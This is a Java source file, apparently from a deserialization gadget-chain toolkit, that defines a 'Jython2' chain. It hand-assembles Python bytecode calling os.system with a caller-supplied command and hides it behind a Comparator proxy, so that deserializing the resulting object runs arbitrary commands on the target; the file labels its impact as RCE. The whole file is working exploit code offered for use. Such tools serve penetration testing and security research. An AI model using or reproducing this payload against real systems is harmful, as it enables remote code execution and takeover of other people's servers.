package org.ses.gadgetbuilder.chains2;

import org.python.core.*;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.annotations.*;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Proxy;
import java.util.Comparator;

import java.math.BigInteger;

@Dependencies({ "org.python:jython-standalone:2.5.2" })
@Authors({ Authors.PWNTESTER, Authors.CSCHNEIDER4711, Authors.YKOSTER })
@Impact(Impact.RCE)
public class Jython2 extends GadgetChain<CompareTrampoline> {

    public Jython2(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        String code =
                "740000" + // 0 LOAD_GLOBAL              0 (eval)
                        "640100" + // 3 LOAD_CONST               1 ("__import__('os', globals(), locals(), ['system'], 0).system('<command>')")
                        "830100" + // 6 CALL_FUNCTION            1
                        "01" +     // 9 POP_TOP
                        "640000" + //10 LOAD_CONST               0 (None)
                        "53";      //13 RETURN_VALUE
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString("__import__('os', globals(), locals(), ['system'], 0).system('" + command.replace("'", "\\'") + "')")};
        String[] names = new String[]{"eval"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{ "", "" }, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        // Create a PyFunction Invocation handler that will call our python bytecode when intercepting any method
        PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        return new TrampolineConnector(comparator, 1,1);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

}
